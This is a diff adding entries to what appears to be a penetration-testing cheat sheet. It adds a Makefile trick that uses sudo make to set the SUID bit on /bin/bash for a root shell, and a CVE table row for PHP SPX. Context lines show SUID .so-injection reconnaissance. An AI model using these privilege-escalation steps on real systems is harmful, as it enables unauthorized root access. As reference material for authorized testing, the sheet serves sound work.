@@ -511,6 +511,16 @@ Create a new file in the working directory to insert flags for malicious use. [h
 ## Linux - binaries
 	gtfobins.org
 
+## Linux - SUID make
+Create a `Makefile` with desired bash commands e.g.  
+
+	Makefile:
+
+	action:
+		chmod u+s /bin/bash
+Then run `sudo make action` on the directory containing the `Makefile`.  
+Change `action` to whatever if necessary.  
+
 ## Linux - .so (shared object) injection
 	strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
 Check if SUID binary attempts to read .so file that can be injected  
@@ -750,6 +760,7 @@ GET/POST parameters
 |pdfkit|<=0.8.7.2|CVE-2022-25765|[exploitdb](https://www.exploit-db.com/exploits/51293)|Point to the POST endpoint|
 |wp-advanced-search|<3.3.9.2|CVE-2024-9796|[wpscan](https://wpscan.com/vulnerability/2ddd6839-6bcb-4bb8-97e0-1516b8c2b99b/)|Use PoC SQL injection|
 |PyLoad|0.5.0|CVE-2023-0297|[exploitdb](https://www.exploit-db.com/exploits/51532)|First check if `/flash/addcrypted2` endpoint is available|
+|PHP SPX||CVE-2024-42007|[github issue](https://github.com/NoiseByNorthwest/php-spx/issues/251)|Replace SPX_KEY with server SPX key|
 
 
 ## Run new shell
